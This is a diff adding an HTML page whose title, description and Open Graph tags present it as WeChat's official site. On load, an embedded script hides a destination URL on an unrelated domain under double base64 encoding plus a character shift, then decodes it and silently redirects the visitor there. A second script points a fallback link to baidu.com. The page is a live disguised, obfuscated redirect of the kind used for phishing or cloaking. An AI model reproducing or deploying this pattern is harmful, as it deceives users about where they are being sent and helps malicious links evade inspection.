@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>微信，是一个生活方式</title>
+    <meta name="description" content="一款跨平台的通讯工具。支持单人、多人参与。通过手机网络发送语音、图片、视频和文字。">
+    <!-- 添加Open Graph meta标签 -->
+    <meta property="og:site_name" content="Qq">
+    <meta property="og:title" content="微信，是一个生活方式">
+    <meta property="og:description" content="一款跨平台的通讯工具。支持单人、多人参与。通过手机网络发送语音、图片、视频和文字。">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://weixin.qq.com">
+</head>
+<body>
+<script>
+    (function() {
+       
+        var url = "https://899963s-6sa3.3eeq.3ytuuii.fangxiangyishu.com";
+
+     
+        var encodedUrl = btoa(url);
+
+        
+        encodedUrl = btoa(encodedUrl);
+
+       
+        var chars = encodedUrl.split('').map(function(c) {
+            return String.fromCharCode(c.charCodeAt(0) + 1);
+        }).join('');
+
+        
+        function decode(encoded) {
+            var decoded = encoded.split('').map(function(c) {
+                return String.fromCharCode(c.charCodeAt(0) - 1);
+            }).join('');
+            decoded = atob(decoded);
+            return atob(decoded);
+        }
+
+        
+        window.location.href = decode(chars);
+    })();
+</script>
+<p>If you are not redirected automatically, follow this <a id="redirect-link" href="#">link</a>.</p>
+<script type="text/javascript">
+
+    (function() {
+       
+        var url = "https://www.baidu.com";
+
+       
+        var encodedUrl = btoa(url);
+
+        
+        encodedUrl = btoa(encodedUrl);
+
+        
+        var chars = encodedUrl.split('').map(function(c) {
+            return String.fromCharCode(c.charCodeAt(0) + 1);
+        }).join('');
+
+        
+        function decode(encoded) {
+            var decoded = encoded.split('').map(function(c) {
+                return String.fromCharCode(c.charCodeAt(0) - 1);
+            }).join('');
+            decoded = atob(decoded);
+            return atob(decoded);
+        }
+
+        
+        document.getElementById("redirect-link").href = decode(chars);
+    })();
+</script>
+</body>
+</html>
